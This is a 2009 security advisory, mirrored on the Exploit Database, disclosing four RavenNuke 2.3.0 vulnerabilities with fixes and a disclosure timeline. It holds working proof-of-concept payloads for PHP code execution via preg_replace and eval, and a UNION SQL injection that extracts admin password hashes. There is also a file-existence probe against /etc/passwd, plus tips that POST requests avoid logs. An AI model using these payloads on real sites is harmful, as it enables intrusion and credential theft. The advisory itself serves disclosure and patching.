[waraxe-2009-SA#072] - Multiple Vulnerabilities in RavenNuke 2.3.0
===============================================================================

Author: Janek Vind "waraxe"
Date: 16. February 2009
Location: Estonia, Tartu
Web: http://www.waraxe.us/advisory-72.html

Description of vulnerable software:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

RavenNuke is a web-based automated news publishing and content management
system based on PHP and MySQL. The system is fully controlled using a web-based
graphical user interface (GUI). RavenNuke is an extensively changed fork of
the phpNuke\portal system.

http://ravenphpscripts.com/

List of found vulnerabilities
===============================================================================

1. Remote Php Code Execution in "avatarlist.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Security risk: High

Reasons:
  1. uninitialized arrays "patterns" and "replacements"
Preconditions:
  1. attacker must be logged in as user
Comments:
  1. Exploit is using "preg_replace" e-modifier
  2. "register_globals" setting does not matter
  3. Sentinel will not stop this exploit
  4. POST method will leave clean logs in most real-world cases

Test using GET method:

http://localhost/ravennuke230/modules.php?name=Your_Account&op=avatarlist
&avatarcategory=gallery&patterns[6]=/a/e&replacements[6]=phpinfo()

Test using POST method:
------------------------------------------------------------
<html><body><center>
<form action="http://localhost/ravennuke230/modules.php?
name=Your_Account&op=avatarlist" method="post">
<input type="hidden" name="avatarcategory" value="gallery">
<input type="hidden" name="patterns[6]" value="/a/e">
<input type="hidden" name="replacements[6]" value="phpinfo()">
<input type="submit" value="Test!">
</form>
</center></body></html>
------------------------------------------------------------

Fragment of vulnerable source code:
------------------------------------------------------------
$patterns[0] = '/\.gif/';
$patterns[1] = '/\.png/';
...
$replacements[1] = '';
$replacements[0] = '';
...
$entryname = preg_replace($patterns, $replacements, $entry);
------------------------------------------------------------

Solution: initialize arrays before use.

2. Remote Php Code Execution in "Your Account" module
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Security risk: medium

Reasons:
  1. insecure use of "eval()" php function
Precoditions:
  1. Attacker must have admin rights for "Your Account" in
  order to change custom fields
Comments:
  1. This is privilege escalation vulnerability

Test:

1. log in as admin and go to "Custom Fields" in users administration:

http://localhost/ravennuke230/admin.php?op=yaCustomFields

2. insert "_Z;phpinfo()" (without quotes) into input box "ID Field Name"

3. click "Save fields"

4. now go to "Users":

http://localhost/ravennuke230/admin.php?op=yaUsers

and select "User Details" for any user, click "OK".
Resulting page will display output of the "phpinfo()", done  :)

Fragment of vulnerable source code:
-------------------------------------------------------
/* Get Custom Fields and display them in desired order
...
$result = $db->sql_query('SELECT * FROM ' . $user_prefix . '_users_fields
 WHERE need <> "0" AND public="1" ORDER BY pos');
...
while ($sqlvalue = $db->sql_fetchrow($result)) {
  if (substr($sqlvalue['name'], 0, 1) == '_')
@eval('$name_exit = ' . $sqlvalue['name'] . ';');
-------------------------------------------------------

3. Sql Injection in "Resend_Email" module
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Security risk: medium

Reasons:
  1. Insecure use of "extract()" php function
Preconditions:
  1. attacker must be logged in as admin

Comments:
  1. This is privilege escalation vulnerability
  2. POST method will leave clean logs in most real-world cases

Test using POST method:
------------------------------------------------------------
<html><body><center>
<form action="http://localhost/ravennuke230/modules.php
?name=Resend_Email" method="post">
<input type="hidden" name="user_prefix"
value="nuke_users_temp WHERE 1=2 UNION SELECT 1,2,
CONCAT_WS(0x3a,aid,name,radminsuper,email,pwd),4,5,6,7,8 FROM nuke_authors-- ">
<input type="submit" value="Test!">
</form>
</center></body></html>
------------------------------------------------------------

Fragment of vulnerable source code:
------------------------------------------------------------
if (!is_admin($admin)) endit(_ACCESSDENIED);
...
extract($HTTP_POST_VARS);
...
$result = $db->sql_query('select user_id, username, user_email, user_password,
user_regdate, check_num, time, requestor from '.$user_prefix.'_users_temp');
------------------------------------------------------------

Solution: use EXTR_SKIP to avoid overwriting of existing variables

4. Remote Detection of Local Files in "captcha.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Security risk: low

Reasons:
  1. uninitialized array "aFonts"
Preconditions:
  1. "register_globals=on"
  2. "display_errors=on"
Comments:
  1. multiple page refreshes may needed because of source code specifics
  2. same method works for remote directories too!

Attacker is able to detect existance of remote files or directories
via different error messages, emitted by php.

Test 1:

http://localhost/ravennuke230/images/captcha.php?aFonts[]=/etc/waraxe

Result:

Warning: imageftbbox() [function.imageftbbox]: Invalid font filename in
C:\apache_wwwroot\ravennuke230\includes\class.php-captcha.php on line 298

"Invalid font filename" --> file does not exist

One more possible error message:

Warning: imageftbbox(): Could not find/open font in ...

"Could not find/open font" --> file does not exist

Test 2:

http://localhost/ravennuke230/images/captcha.php?aFonts[]=/etc/passwd

Result:

Warning: imageftbbox() [function.imageftbbox]: Could not read font in
C:\apache_wwwroot\ravennuke230\includes\class.php-captcha.php on line 298

"Could not read font" --> file exists

How to fix:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Upgrade to new version 2.30.01

Disclosure Timeline:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

01/16/09 Developer contacted
01/16/09 Developer's initial response
01/17/09 Fidings sent to developer
02/15/09 Patched version 2.30.01 released by developer

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
